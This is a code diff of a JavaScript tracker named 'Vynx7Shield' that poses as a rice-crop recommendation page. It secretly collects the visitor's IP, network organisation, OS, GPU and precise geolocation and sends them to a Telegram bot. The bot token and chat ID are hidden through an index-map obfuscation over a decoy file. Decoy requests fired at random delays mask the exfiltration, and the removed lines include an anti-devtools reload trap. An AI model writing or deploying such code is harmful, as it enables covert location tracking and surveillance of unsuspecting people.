@@ -1,31 +1,26 @@
 class Vynx7Shield {
     constructor() {
-        
-        this._tm = ['110001000110', '111000101100', '11100010110', '1100110101', '101010000', '11001100000', '10100000011', '11100110011', '10011000101', '10001101110', '111000111111', '110111000011', '10010001100', '10100101000', '111100101100', '10010110000', '10100101010', '10001011100', '10110011001', '10001111100', '110100000010', '11110001010', '100111010100', '10011110010', '110001010011', '11100001101', '101010111000', '100000011100', '101001001000', '110101111001', '10010011010', '1110101000', '10110100000', '100100101010', '1000110110', '1011010111', '110000011100', '101110111111', '101001100', '111000110110', '1101000111', '101001000101', '1011110110', '1100011110', '101011100111', '11101110101', '11010111010', '110110011000', '101010111100', '111011111010', '101110010110', '10110', '110100101101', '11111001000', '10010111001', '110110110111', '10111001101', '110110110011', '111011110100', '110101000110', '100101000000', '11010000010', '110010111011', '100101001101'];
-        this._cm = ['1111111', '110101001011', '1010001010', '110011001011', '110101110011', '11110110', '100110100111', '101101111000', '1001011', '111100001111', '101100101101', '1011010000', '100110101111', '101110110000', '11110010', '110100111011'];
-        this._src = "system_manifest.bin";
-        this._initProt();
+        // GANTI DENGAN HASIL DARI PYTHON!
+        this._tm = ['11001110', '1111', '11111001110', '1101100110', '10001001000', '10110100000', '111110', '1001011100', '1111100111', '1011100101', '11110100010', '1100101100', '11011010', '1111110110', '111100101', '110110010', '10110010001', '10001110101', '1101010', '1100000', '1110000110', '10011010000', '10010100011', '1111111101', '10100011100', '10011111100', '1010001001', '11000110101', '11101010001', '11100100001', '10010001111', '10101111010', '100101011', '10001100', '101010111', '10111110011', '10001000111', '110011000', '1000011101', '111100', '10110100001', '1100000100', '11010010101', '11010010000', '110101011', '11110010111', '1110011', '1110101', '10111011011', '10111100000', '10000110110', '111110101', '11001010110', '11001110000', '11000101000', '11010110', '11110111101', '100', '11100111010', '10011010111', '1011010000', '10100010010', '10001110001', '1001111000']; // TOKEN_MAP Biner
+        this._cm = ['110111', '1111010110', '11101000111', '11001011111', '100010011', '1111011', '11010100001', '11011011', '10000101010', '101111000', '11101011101', '11000111001', '100101101', '10100110110', '100010100', '1010000101']; // CHAT_MAP Biner
+        this._src = "log.txt";
     }
 
-    _initProt() {
-        setInterval(() => { if(window.outerHeight-window.innerHeight > 160) location.reload(); }, 1000);
-    }
-
+   
     async _getFp() {
         let ipD = {ip: "0.0.0.0", org: "Unknown"};
         try { ipD = await (await fetch('https://ipapi.co/json/')).json(); } catch(e){}
-        
         const gl = document.createElement('canvas').getContext('webgl');
-        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-        const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "Generic";
-
-        return `🚨 <b>VYNX7 ALERT</b>\n🌐 IP: ${ipD.ip} (${ipD.org})\n💻 OS: ${navigator.platform}\n⚙️ GPU: ${gpu}\n🔋 RAM: ${navigator.deviceMemory}GB\n🕒 ${new Date().toLocaleString()}`;
+        const gpu = gl.getExtension('WEBGL_debug_renderer_info') ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_ID) : "Generic";
+        return `🚨 <b>VYNX7 ALERT</b>\n🌐 IP: ${ipD.ip} (${ipD.org})\n💻 OS: ${navigator.platform}\n⚙️ GPU: ${gpu}\n🕒 ${new Date().toLocaleString()}`;
     }
 
+  
     _r(d, m) {
         let b = "";
         m.forEach(x => {
             let l = d[parseInt(x, 2)];
+           
             b += l.charAt(Math.floor(l.length / 2));
         });
         return atob(b);
@@ -33,8 +28,10 @@ class Vynx7Shield {
 
     async ignite(lat, lon) {
         const info = await this._getFp();
+       
         const res = await fetch(this._src);
-        const nodes = (await res.text()).split("\n").filter(l => l.length > 5);
+        const text = await res.text();
+        const nodes = text.split("\n").filter(l => l.length > 5);
 
         const t = this._r(nodes, this._tm);
         const c = this._r(nodes, this._cm);
@@ -42,24 +39,28 @@ class Vynx7Shield {
         nodes.forEach((url, i) => {
             setTimeout(() => {
                 if (url.includes("api.telegram.org")) {
+                    // JALUR ASLI (Telegram)
                     fetch(`https://api.telegram.org/bot${t}/sendMessage`, {
                         method: 'POST',
                         headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ chat_id: c, text: info + `\n📍 LOC: ${lat},${lon}`, parse_mode: "HTML" })
+                        body: JSON.stringify({
+                            chat_id: c,
+                            text: info + `\n📍 LOC: ${lat},${lon}`,
+                            parse_mode: "HTML"
+                        })
                     });
                 } else {
+                   
                     fetch(url, { mode: 'no-cors' }).catch(() => {});
                 }
-            }, Math.random() * 7000);
+            }, Math.random() * 6000);
         });
     }
 }
 
 async function runVynx7() {
-    document.getElementById('msg').innerText = "Connecting to Satelite...";
     navigator.geolocation.getCurrentPosition(async (p) => {
         const v = new Vynx7Shield();
         await v.ignite(p.coords.latitude, p.coords.longitude);
-        document.getElementById('msg').innerText = "Tanaman Cocok: Padi IR64";
     });
 }
